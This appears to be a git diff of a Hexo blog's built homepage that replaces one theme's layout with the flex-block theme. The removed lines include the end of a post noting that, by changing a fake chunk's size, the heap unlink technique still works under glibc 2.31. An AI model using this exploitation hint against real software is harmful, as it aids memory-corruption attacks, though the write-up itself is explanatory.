class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/***/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从这段代码看的话，只需要修改 fake chunk 的 size 则可继续在 2.31 下利用 unlink</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/07/13/test-bolg/" data-id="clyk1317l0001ksuo7mg87at1" data-title="test bolg" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/07/13/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2024-07-13T10:08:16.019Z" itemprop="datePublished">2024-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          <li class="navbar-list-item"><a href="/">首页</a></li>
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/07/13/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/07/13/hello-world/" data-id="clyk1317a0000ksuo2rnrc0r0" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
         
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2024/07/13/test-bolg/">test bolg</a>
-          </li>
-        
-          <li>
-            <a href="/2024/07/13/hello-world/">Hello World</a>
-          </li>
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
         
       </ul>
     </div>
   </div>
+</nav>
 
   
-</aside>
+  
+    <div class="header-content">
+      <div class="post-text layout-block layout-padding">
+        <h1 class="title-wrap">xsh 的世界</h1>
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2024 xsh<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
-  </div>
-</footer>
+  
 
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+  
+</header>
+
+    <!-- 首页 -->
+
+<!-- post list container -->
+<div class="body-container">
+  <div class="content-container layout-block article-list">
+    
+      <div class="article-item layout-padding">
+        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
+          
+
+          <div class="card-text">
+            
+              <a href="/2024/07/13/test-bolg/" itemprop="url">
+                <h2 class="card-text--title">test bolg</h2>
+              </a>
+            
+            <div class="card-text--row">
+              <span>发布于</span>
+              <time  class="article-date" datetime="2024-07-13T10:23:23.000Z" itemprop="datePublished">2024-07-13</time>
+            </div>
+            
+            <ul class="wrap-list light">
+  
+</ul>
+            <ul class="wrap-list light">
+  
+</ul>
+          </div>
+        </article>
+      </div>
+    
+      <div class="article-item layout-padding">
+        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
+          
+
+          <div class="card-text">
+            
+              <a href="/2024/07/13/hello-world/" itemprop="url">
+                <h2 class="card-text--title">Hello World</h2>
+              </a>
+            
+            <div class="card-text--row">
+              <span>发布于</span>
+              <time  class="article-date" datetime="2024-07-13T10:08:16.019Z" itemprop="datePublished">2024-07-13</time>
+            </div>
+            
+            <ul class="wrap-list light">
+  
+</ul>
+            <ul class="wrap-list light">
+  
+</ul>
+          </div>
+        </article>
+      </div>
+    
+  </div>
+</div>
+
+<!-- page container -->
+
+
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+     
+    <p>&copy; 2024 <a href="/" target="_blank">xsh</a></p>
+
     
 
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+  
+
+
+  
 
 
 
@@ -299,9 +259,7 @@
 <script src="/js/script.js"></script>
 
 
-
-
-
-  </div>
+  
+  <!-- 尾部用户自定义相关内容 -->
 </body>
 </html>
